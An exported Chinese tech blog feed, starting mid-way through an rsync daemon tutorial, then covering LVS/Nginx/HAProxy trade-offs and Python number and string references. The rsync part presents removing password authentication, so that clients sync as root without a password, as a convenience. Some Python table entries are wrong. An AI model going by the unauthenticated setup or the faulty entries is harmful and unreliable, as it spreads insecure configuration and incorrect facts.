： port 指定在哪个端口启动rsyncd服务，默认是873 log file 指定日志文件 pid file 指定pid文件，这个文件的作用涉及到服务的启动以及停止等进程管理操作 address 指定启动rsyncd服务的IP，假如你的机器有多个IP，就可以指定其中一个启动rsyncd服务，默认是在全部IP上启动 [test] 指定模块名，自定义 path 指定数据存放的路径 use chroot true|false 默认是true，意思是在传输文件以前首先chroot到path参数所指 定的目录下。这样做的原因是实现额外的安全防护，但是缺点是需要以roots权限，并且不能备份指向外部的符号连接所指向的目录文件。默认情况下chroot值为true，如果数据当中有软连接文件的话建议设置成false。 max connections 指定最大的连接数，默认是0即没有限制 read only ture|false 如果为true则不能上传到该模块指定的路径下 list 指定当用户查询该服务器上的可用模块时，该模块是否被列出，设定为true则列出，false则隐藏 uid/gid 指定传输文件时，以哪个用户/组的身份传输 auth users 指定传输时要使用的用户名 secrets file 指定密码文件，该参数连同上面的参数如果不指定则不使用密码验证，注 意该密码文件的权限一定要是600 hosts allow 指定被允许连接该模块的主机，可以是IP或者网段，如果是多个，之间用空格隔开 2、编辑secrets file，保存后要赋予600权限，如果权限不对，不能完成同步123[root@yanyi-1 ~]# cat /etc/rsyncd.passwdtest:test123[root@yanyi-1 ~]# chmod 600 /etc/rsyncd.passwd 3、启动rsync服务1[root@yanyi-1 ~]# rsync --daemon --config=/etc/rsyncd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动后，可以查看一下日志，并查看端口是否启动： 1234[root@yanyi-1 ~]# cat /var/log/rsync.log[root@yanyi-1 ~]# netstat -lnp |grep 873tcp 0 0 0.0.0.0:873 0.0.0.0:* LISTEN 12066/rsynctcp 0 0 :::873 :::* LISTEN 12066/rsync &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想开机启动，把 rsync --daemon --config=/etc/rsyncd.conf 写入到 /etc/rc.d/rc.local 文件中。 4、到另一台机器上测试1234567891011121314[root@yanyi ~]# rsync -avL test@192.168.0.10::test/test1/ /tmp/test5/Password:receiving incremental file listcreated directory /tmp/test5./11.txt22.txt34sent 143 bytes received 354 bytes 994.00 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;刚提到有一个选项叫做 use chroot 默认为true，如果为true，同步的文件中有软连接，则会有问题。首先在主机yanyi-1的/root/rsync/test1/目录下创建一个软连接文件： 123[root@yanyi-1 ~]# ln -s /root/test.txt rsync/test1/test.txt[root@yanyi-1 ~]# ls -l rsync/test1/test.txtlrwxrwxrwx 1 root root 14 6月 12 13:24 rsync/test1/test.txt -&gt; /root/test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后再到主机yanyi上同步： 1234567891011121314151617[root@yanyi ~]# rsync -avL test@192.168.0.10::test/test1/ /tmp/test6/Password:receiving incremental file listsymlink has no referent: "/test1/test.txt" (in test)created directory /tmp/test6./11.txt22.txt34sent 143 bytes received 419 bytes 1124.00 bytes/sectotal size is 0 speedup is 0.00rsync error: some files/attrs were not transferred (see previous errors) (code23) at main.c(1532) [generator=3.0.6] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到，如果设置 use chroot 为true则同步软连接文件会有问题，把主机yanyi-1的rsync配置文件修改一下，把true改为false： 123[root@yanyi-1 ~]# sed -i 's/use chroot=true/use chroot=false/' /etc/rsyncd.conf[root@yanyi-1 ~]# grep 'use chroot' /etc/rsyncd.confuse chroot=false &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后再到主机yanyi上再次执行同步： 123456789101112131415[root@yanyi ~]# rsync -avL test@192.168.0.10::test/test1/ /tmp/test7/Password:receiving incremental file listcreated directory /tmp/test7./11.txt22.txt34test.txtsent 162 bytes received 410 bytes 1144.00 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就没有任何问题了。为什么修改完rsyncd.conf配置文件后，没有重启rsyncd服务？其实这是rsync的一个特定机制，配置文件即实时生效的，不用重启服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的例子中，都有输入密码，这样同样不能写入脚本中自动执行，其实这种方式也是可以不用手动输入密码的，有两种实现方式： 1、指定密码文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在客户端上，也就是主机yanyi上，编辑一个密码文件： 1[root@yanyi ~]# vim /etc/pass &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入test用户的密码： 12[root@yanyi ~]# cat /etc/passtest123 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改密码文件的权限： 1[root@yanyi ~]# chmod 600 /etc/pass &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在同步的时候，指定一下密码文件，就可以省去输入密码的步骤了： 1234567891011121314[root@yanyi ~]# rsync -avL test@192.168.0.10::test/test1/ /tmp/test8/ --password-file=/etc/passreceiving incremental file listcreated directory /tmp/test8./11.txt22.txt34test.txtsent 190 bytes received 451 bytes 1282.00 bytes/sectotal size is 0 speedup is 0.00 2、在rsync服务器端不指定用户&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在服务端也就是主机yanyi-1上修改配置文件rsyncd.conf，去掉关于认证账户的配置项(auth user和secrets file这两行)： 1sed -i 's/auth users/#auth users/;s/secrets file/#secrets file/' /etc/rsyncd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的命令是把“auth users”和“secrets file”两行的最前面加一个“#”，这样就把这两行注释掉了，使其失去意义。sed的这种用法，只是用分号把两个替换的子命令块给替换了。然后到客户端主机yanyi上测试： 12345678910111213rsync -avL 192.168.0.10::test/test1/ /tmp/test9/receiving incremental file listcreated directory /tmp/test9./11.txt22.txt34test.txtsent 162 bytes received 410 bytes 1144.00 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，这里不用再加test这个用户了，默认是以root的身份拷贝的，现在已经不需要输入密码了。 实例8：根据一个文件列表文档来同步&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，需要根据一个文档中的文件列表来同步文件。例，1.txt是文件列表，内容为： 1234cat 1.txt/data/a/a.txt/data/b.txt/data/c/b/c.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同步命令是： 1rsync -av --files-from=1.txt / ip::module/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要注意的是，1.txt中如果写全局路径，那么source目录需要写/ 实例9：在远程自动创建目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认情况下，使用rsync的时候，不能自动创建级联目录。 1rsync -a /data/1/2/3/1.txt 1.1.1.1:/data/1/2/3/1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样会报错的。改一改上边的命令 1rsync -a /data/1/2/3/1.txt 1.1.1.1:/data/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样同样也达不到想要的效果。虽然不在报错，但是只是把1.txt放到了1.1.1.1:/data/目录下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rsync有个选项就是-R，会帮助我们自动创建级联目录。所以上边的命令应该改成 1rsync -aR /data/1/2/3/1.txt 1.1.1.1:/data/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就会在1.1.1.1:/data/目录下创建1/2/3/这样的级联目录，类似mkdir -p 实例10：只同步指定类型的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求：同步某个目录下所有的图片（*.jpg），该目录下有很多其他的文件，但只想同步*.jpg的文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rsync有一个 --exclude 可以排除指定文件，还有一个 --include 选项的作用正好和 --exclude 相反。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接使用 --include=&quot;*.jpg&quot; 可否实现？ 1rsync -av --include="*.jpg" /src/ /des/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实验证明，这是不对的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正确的答案是： 1rsync -av --include="*.jpg" --exclude=* /src/ /des/]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS、Nginx、HaProxy 优缺点]]></title>
    <url>%2F2017%2F08%2F10%2FHaproxy%2F2.%20LVS%E3%80%81Nginx%E3%80%81HaProxy%20%E4%BC%98%E7%BC%BA%E7%82%B9%2F</url>
    <content type="text"><![CDATA[LVS、Nginx、HaProxy 优缺点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;搭建负载均衡高可用环境相对简单，主要是要理解其中原理。此文描述了三种负载均衡器的优缺点，以便在实际的生产应用中，按需求取舍。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前，在线上环境中应用较多的负载均衡器硬件有F5 BIG-IP,软件有LVS，Nginx及HAProxy,高可用软件有Heartbeat、Keepalived，成熟的架构有LVS+Keepalived、Nginx+Keepalived、HAProxy+keepalived及DRBD+Heartbeat. 三种负载均衡器的优缺点说明如下：LVSLVS的优点： 抗负载能力强、工作在第4层仅作分发之用，没有流量的产生，这个特点也决定了它在负载均衡软件里的性能最强的；无流量，同时保证了均衡器IO的性能不会受到大流量的影响； 工作稳定，自身有完整的双机热备方案，如LVS+Keepalived和LVS+Heartbeat； 应用范围比较广，可以对所有应用做负载均衡； 配置性比较低，这是一个缺点也是一个优点，因为没有可太多配置的东西，所以并不需要太多接触，大大减少了人为出错的几率； LVS的缺点： 软件本身不支持正则处理，不能做动静分离，这就凸显了Nginx/HAProxy+Keepalived的优势。 如果网站应用比较庞大，LVS/DR+Keepalived就比较复杂了，特别是后面有Windows Server应用的机器，实施及配置还有维护过程就比较麻烦，相对而言，Nginx/HAProxy+Keepalived就简单多了。 LVS/DR如何处理请求报文的，会修改IP包内容吗？ vs/dr本身不会关心IP层以上的信息，即使是端口号也是tcp/ip协议栈去判断是否正确，vs/dr本身主要做这么几个事： 接收client的请求，根据你设定的负载均衡算法选取一台realserver的ip； 以选取的这个ip对应的mac地址作为目标mac，然后重新将IP包封装成帧转发给这台RS； 在hash table中记录连接信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vs/dr做的事情很少，也很简单，所以它的效率很高，不比硬件负载均衡设备差多少。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据包、数据帧的大致流向是这样的：client –&gt; VS –&gt; RS –&gt; client - 前面已作了回答，vs/dr不会修改IP包的内容. RealServer为什么要在lo接口上配置VIP？在出口网卡上配置VIP可以吗？ 既然要让RS能够处理目标地址为vip的IP包，首先必须要让RS能接收到这个包。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在lo上配置vip能够完成接收包并将结果返回client。 - 答案是不可以将VIP设置在出口网卡上,否则会响应客户端的arp request,造成client/gateway arp table紊乱，以至于整个load balance都不能正常工作。 RealServer为什么要抑制arp帧？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个问题在上一问题中已经作了说明，这里结合实施命令进一步阐述。我们在具体实施部署的时候都会作如下调整： 1234echo "1" &gt;/proc/sys/net/ipv4/conf/lo/arp_ignore echo "2" &gt;/proc/sys/net/ipv4/conf/lo/arp_announce echo "1" &gt;/proc/sys/net/ipv4/conf/all/arp_ignore echo "2" &gt;/proc/sys/net/ipv4/conf/all/arp_announce &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相信很多人都不会弄懂它们的作用是什么，只知道一定得有。我这里也不打算拿出来详细讨论，只是作几点说明，就当是补充吧。 12echo "1" &gt;/proc/sys/net/ipv4/conf/lo/arp_ignore echo "2" &gt;/proc/sys/net/ipv4/conf/lo/arp_announce &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这两条是可以不用的，因为arp对逻辑接口没有意义。 如果你的RS的外部网络接口是eth0，那么 12echo "1" &gt;/proc/sys/net/ipv4/conf/all/arp_ignore echo "2" &gt;/proc/sys/net/ipv4/conf/all/arp_announce &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实真正要执行的是： 12echo "1" &gt;/proc/sys/net/ipv4/conf/eth0/arp_ignore echo "2" &gt;/proc/sys/net/ipv4/conf/eth0/arp_announce &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以我个人建议把上面两条也加到你的脚本里去，因为万一系统里上面两条默认的值不是0，那有可能是会出问题滴。 LVS/DR load balancer（director）与RS为什么要在同一网段中？ 从第一个问题中大家应该明白vs/dr是如何将请求转发给RS的了吧？它是在数据链路层来实现的，所以director必须和RS在同一网段里面。 为什么director上lo接口除了VIP另外还要在eth0配一个ip（即DIP）？ 如果是用了keepalived等工具做HA或者Load Balance,则在健康检查时需要用到DIP。 没有健康检查机制的HA或者Load Balance则没有存在的实际意义。 LVS/DR ip_forward需要开启吗？ 不需要。因为director跟realserver是同一个网段，无需开启转发。 director的vip的netmask一定要是255.255.255.255吗？ lvs/dr里，director的vip的netmask 没必要设置为255.255.255.255，也不需要再去 route add -host $VIP dev eth0:0 director的vip本来就是要像正常的ip地址一样对外通告的,不要搞得这么特殊. LVS/DR如何进行tcp的三次握手？ NginxNginx的优点： 工作在OSI第7层，可以针对http应用做一些分流的策略。比如针对域名、目录结构。它的正则比HAProxy更为强大和灵活； Nginx对网络的依赖非常小，理论上能ping通就就能进行负载功能，这个也是它的优势所在； Nginx安装和配置比较简单，测试起来比较方便； 可以承担高的负载压力且稳定，一般能支撑超过几万次的并发量； Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点； Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器。LNMP现在也是非常流行的web环境，大有和LAMP环境分庭抗礼之势，Nginx在处理静态页面、特别是抗高并发方面相对apache有优势； Nginx现在作为Web反向加速缓存越来越成熟了，速度比传统的Squid服务器更快，有需求的朋友可以考虑用其作为反向代理加速器； Nginx的缺点： Nginx不支持url来检测。 Nginx仅能支持http和Email，这个它的弱势。 Nginx的Session的保持，Cookie的引导能力相对欠缺。 HaProxyHAProxy的优点： HAProxy是支持虚拟主机的，可以工作在4、7层(支持多网段)； 能够补充Nginx的一些缺点比如Session的保持，Cookie的引导等工作； 支持url检测后端的服务器； 它跟LVS一样，本身仅仅就只是一款负载均衡软件；单纯从效率上来讲HAProxy更会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的； HAProxy可以对Mysql读进行负载均衡，对后端的MySQL节点进行检测和负载均衡，不过在后端的MySQL slaves数量超过10台时性能不如LVS； HAProxy的算法较多，达到8种；]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>haproxy</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 的数值]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.5%20Python%20%E7%9A%84%E6%95%B0%E5%80%BC%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%2F6.%20Python%20%E7%9A%84%E6%95%B0%E5%80%BC%2F</url>
    <content type="text"><![CDATA[Python Number（数字）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python Number 数据类型用于存储数值。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据类型是不允许改变的，这就意味着如果改变 Number 数据类型的值，将重新分配内存空间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下实例在变量赋值时 Number 对象被创建： 12var1 = 1var2 = 10 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以使用 del 语句删除一些 Number 对象引用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;del 语句的语法是： 1del var1[,var3[,var3[....,varN]]]] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以通过使用 del 语句删除单个或多个对象： 12del vardel var_a, var_b &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 支持四种不同的数值类型 整型（int）-通常被称为是整型或整数，是正或负整数，不带小数点。 长整型(long integers)-无限大小的整数，证书最后是一个大写或小写的L。 浮点型（floating point real values）-浮点型由整数部分与小数部分组成，浮点型也可以使用科学计数法表示 （$2.5e2=2.5x10^2=250$） 复数（complex numbers）-复数由实数部分和叙述部分构成，可以用 a + bj ,或者 complex(a,b) 表示，复数的实部 a 和虚部 b 都是浮点型。 int long float complex 10 51924361L 0.0 3.14j 100 -0x1932L 15.20 45.j -786 0122L -21.9 9.322e-36j 080 0xDEFABCECBDAECBFBAEI 32.3+e18 .876j -0490 535633629843L -90. -.6545+0j -0x260 -052318172735L -32.54e100 3e+26j 0x69 -472188529L 70.2-E12 4.53e-7j 长整型也可以使用小写 “L”，但是还是建议使用大写 “L”，避免与数字 “1” 混淆。Python 使用 “L” 来显示长整型。 Python 还支持复数，复数由实数部分和虚数部分构成，可以用 a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。 Python Number 类型转换 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; int(x [,base ]) 将x转换为一个整数 long(x [,base ]) 将x转换为一个长整数 float(x ) 将x转换到一个浮点数 complex(real [,imag ]) 创建一个复数 str(x ) 将对象 x 转换为字符串 repr(x ) 将对象 x 转换为表达式字符串 eval(str ) 用来计算在字符串中的有效Python表达式,并返回一个对象 tuple(s ) 将序列 s 转换为一个元组 list(s ) 将序列 s 转换为一个列表 chr(x ) 将一个整数转换为一个字符 unichr(x ) 将一个整数转换为Unicode字符 ord(x ) 将一个字符转换为它的整数值 hex(x ) 将一个整数转换为一个十六进制字符串 oct(x ) 将一个整数转换为一个八进制字符串 Python 数学函数 函数 返回值（描述） abs(x)%E5%87%BD%E6%95%B0.md) 返回数字的绝对值，如abs(-10) 返回 10 ceil(x)%E5%87%BD%E6%95%B0.md) 返回数字的上入整数，如math.ceil(4.1) 返回 5 cmp(x, y)%E5%87%BD%E6%95%B0.md) 如果 x &lt; y 返回 -1, 如果 x == y 返回 0, 如果 x &gt; y 返回 1 exp(x)%E5%87%BD%E6%95%B0.md) 返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045 fabs(x)%E5%87%BD%E6%95%B0.md) 返回数字的绝对值，如math.fabs(-10) 返回10.0 floor(x)%E5%87%BD%E6%95%B0.md) 返回数字的下舍整数，如math.floor(4.9)返回 4 log(x)%E5%87%BD%E6%95%B0.md) 如math.log(math.e)返回1.0,math.log(100,10)返回2.0 log10(x)%E5%87%BD%E6%95%B0.md) 返回以10为基数的x的对数，如math.log10(100)返回 2.0 max(x1, x2,…)%E5%87%BD%E6%95%B0.md) 返回给定参数的最大值，参数可以为序列。 min(x1, x2,…)%E5%87%BD%E6%95%B0.md) 返回给定参数的最小值，参数可以为序列。 modf(x)%E5%87%BD%E6%95%B0.md) 返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。 pow(x, y)%E5%87%BD%E6%95%B0.md) x**y 运算后的值。 round(x [,n])%E5%87%BD%E6%95%B0.md) 返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。 sqrt(x)%E5%87%BD%E6%95%B0.md) 返回数字x的平方根，数字可以为负数，返回类型为实数，如math.sqrt(4)返回 2+0j Python 随机数函数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;随机数可以用于数学、游戏、安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 包含以下常用随机数函数： 函数 描述 choice(seq)%E5%87%BD%E6%95%B0.md) 从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。 randrange ([start,] stop [,step])%E5%87%BD%E6%95%B0.md) 从指定范围内，按指定基数递增的集合中获取一个随机数，基数缺省值为1 random()%E5%87%BD%E6%95%B0.md) 随机生成下一个实数，它在[0,1)范围内。 seed([x])%E5%87%BD%E6%95%B0.md) 改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。 shuffle(lst)%E5%87%BD%E6%95%B0.md) 将序列的所有元素随机排序 uniform(x, y)%E5%87%BD%E6%95%B0.md) 随机生成下一个实数，它在[x,y]范围内。 Python 三角函数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 包括以下三角函数： 函数 描述 acos(x)%E5%87%BD%E6%95%B0.md) 返回x的反余弦弧度值。 asin(x)%E5%87%BD%E6%95%B0.md) 返回x的反正弦弧度值。 atan(x)%E5%87%BD%E6%95%B0.md) 返回x的反正切弧度值。 atan2(y, x)%E5%87%BD%E6%95%B0.md) 返回给定的 X 及 Y 坐标值的反正切值。 cos(x)%E5%87%BD%E6%95%B0.md) 返回x的弧度的余弦值。 hypot(x, y)%E5%87%BD%E6%95%B0.md) 返回欧几里德范数 sqrt(xx + yy)。 sin(x)%20%E5%87%BD%E6%95%B0.md) 返回的x弧度的正弦值。 tan(x)%20%E5%87%BD%E6%95%B0.md) 返回x弧度的正切值。 degrees(x)%20%E5%87%BD%E6%95%B0.md) 将弧度转换为角度,如degrees(math.pi/2) ， 返回90.0 radians(x)%20%E5%87%BD%E6%95%B0.md) 将角度转换为弧度 Python 数学常量 常量 描述 pi 数学常量 pi （圆周率，一般以π来表示） e 数学常量 e ，e 即自然常数（自然常数）]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 字符串]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.5%20Python%20%E7%9A%84%E6%95%B0%E5%80%BC%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%2F7.%20Python%20%E5%AD%97%E7%AC%A6%E4%B8%B2%2F</url>
    <content type="text"><![CDATA[Python 字符串&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字符串是 Python 中最常用的数据类型。可以使用引号（‘’或“”）来创建字符串。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建字符串很简单，只要为变量分配一个值即可。例如： 12var1 = 'hello world'var2 = "python runoob" Python 访问字符串中的值&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 不支持单字符类型，单字符在 Python 也是作为一个字符串使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 访问子字符串，可以使用方括号来截取字符串，如下实例： 1234567#!/usr/bin/pythonvar1 = 'Hello World!'var2 = "Python Runoob"print "var1[0]: ", var1[0]print "var2[1:5]: ", var2[1:5] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例执行结果： 12var1[0]: Hvar2[1:5]: ytho Python 字符串更新&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以对已存在的字符串进行修改，并赋值给另一个变量，如下实例： 123456#!/usr/bin/python# -*- coding: UTF-8 -*-var1 = 'Hello World!'print "更新字符串 :- ", var1[:6] + 'Runoob!' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例执行结果： 1更新字符串 ：- Hello Runoob! Python 转义字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当需要在字符中使用特殊字符时，Python 用反斜杠（\）转义字符。如下表： 转义字符 描述 \（在行尾时） 续行符 \\ 反斜杠符号 \‘ 反引号 \“ 双引号 \a 响铃 \b 退格（Backspace） \e 转义 \000 空 \n 换行 \v 纵向制表符 \t 横向制表符 \r 回车 \f 换页 \oyy 八进制数，yy代表的字符，例如：\o12 代表换行 \xyy 十六进制数，yy代表的字符，例如：\x0a代表换行 \other 其他的字符以普通格式输出 Python 字符串运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下表实例变量 a 值为字符串 “Hello”，b 变量为 “Python”： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例如下： 1234567891011121314151617181920212223#!/usr/bin/python# -*- coding: UTF-8 -*-a = "Hello"b = "Python"print "a + b 输出结果：", a + b print "a * 2 输出结果：", a * 2 print "a[1] 输出结果：", a[1] print "a[1:4] 输出结果：", a[1:4] if( "H" in a) : print "H 在变量 a 中" else : print "H 不在变量 a 中" if( "M" not in a) : print "M 不在变量 a 中" else : print "M 在变量 a 中"print r'\n'print R'\n' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上程序执行结果为： 12345678a + b 输出结果： HelloPythona * 2 输出结果： HelloHelloa[1] 输出结果： ea[1:4] 输出结果： ellH 在变量 a 中M 不在变量 a 中\n\n Python 字符串格式化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 支持格式化字符串的输出，尽管这样可能会用到非常复杂发表达式，但最基本的用法是将一个值插入到有一个有字符串格式符 %s 发字符串中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 Python 中，字符串格式化使用与 C 中 sprintf函数一样的语法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下实例： 123#!/usr/bin/pythonprint "My name is %s and weight is %d kg!" % ('Zara',21) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例输出结果： 1My name is Zara and weight is 21 kg! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;python 字符串格式化符号： 符号 描述 %c 格式化字符及其ASCII码 %s 格式化字符串 %d 格式化整数 %u 格式化无符号整型 %o 格式化无符号八进制数 %x 格式化无符号十六进制数 %X 格式化无符号十六进制数（大写） %f 格式化浮点数字，可指定小数点后的精度 %e 用科学计数法格式化浮点数 %E 作用同 %e ，用科学计数法格式化浮点数 %g %f 和 %e 的简写 %G %f 和 %E 的简写 %p 用十六进制数格式化变量的地址 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式化操作符辅助指令： 符号 功能 * 定义宽度或者小数点精度 - 用作左对齐 + 在正数前面显示加号（+） 在正数前面显示空格 # 在八进制数前面显示零（‘0’），在十六进制数前显示‘0x’或者‘0X’（取决于用的是‘x’还是‘X’） 0 显示的数字前面填充‘0’而不是默认的空格 % ‘%%’输出一个单一的‘%’ （var） 映射变量（字典参数） m.n. m 是显示的最小总宽度，n 是小数点后的位数(如果可用的话) Python 三引号（triple quotes）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;python 中三引号可以将复杂的字符串进行复制： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;python 三引号允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;三引号的语法是一对连续的单引号或者双引号（通常都是成对的用） 1234567&gt;&gt;&gt; hi = '''hithere'''&gt;&gt;&gt; hi #repr()'hi\nthere'&gt;&gt;&gt; print hi # str()hithere &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;三引号让程序员从引号和特殊字符串的泥潭里面解脱出来，自始至终宝石一小块字符串的格式是所谓的WYSIWYG（所见即所得）格式的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个典型的用例是，当需要一块 HTML 或者SQL时，这是用字符串组合，特殊字符串转义将会非常的繁琐。 123456789101112131415errHTML = '''&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Friends CGI Demo&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H3&gt;ERROR&lt;/H3&gt;&lt;B&gt;%s&lt;/B&gt;&lt;P&gt;&lt;FORM&gt;&lt;INPUT TYPE=button VALUE=BackONCLICK="window.history.back()"&gt;&lt;/FORM&gt;&lt;/BODY&gt;&lt;/HTML&gt;'''cursor.execute('''CREATE TABLE users ( login VARCHAR(8), uid INTEGER,prid INTEGER)''') Unicode 字符串&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 中定义一个 Unicode 字符串和定义一个普通字符串一样简单： 12&gt;&gt;&gt; u'Hello World !'u'Hello World !' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;引号前小写的”u”表示这里创建的是一个 Unicode 字符串。如果你想加入一个特殊字符，可以使用 Python 的 Unicode-Escape 编码。如下例所示： 12&gt;&gt;&gt; u'Hello\u0020World !'u'Hello World !' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;被替换的 \u0020 标识表示在给定位置插入编码值为 0x0020 的 Unicode 字符（空格符）。 python 的字符串内建函数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字符串方法是从python1.6到2.0慢慢加进来的——它们也被加到了Jython中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些方法实现了string模块的大部分方法，如下表所示列出了目前字符串内建支持的方法，所有的方法都包含了对Unicode的支持，有一些甚至是专门用于Unicode的。 方法 描述 string.capitalize() 把字符串的第一个字符大写 string.center(width) 返回一个原字符串居中,并使用空格填充至长度 width 的新字符串 string.count(str, beg=0, end=len(string)) 返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数 string.decode(encoding=’UTF-8’, errors=’strict’) 以 encoding 指定的编码格式解码 string，如果出错默认报一个 ValueError 的 异 常 ， 除 非 errors 指 定 的 是 ‘ignore’ 或 者’replace’ string.encode(encoding=’UTF-8’, errors=’strict’) 以 encoding 指定的编码格式编码 string，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’ string.endswith(obj, beg=0, end=len(string)) 检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False. string.expandtabs(tabsize=8) 把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8。 string.find(str, beg=0, end=len(string)) 检测 str 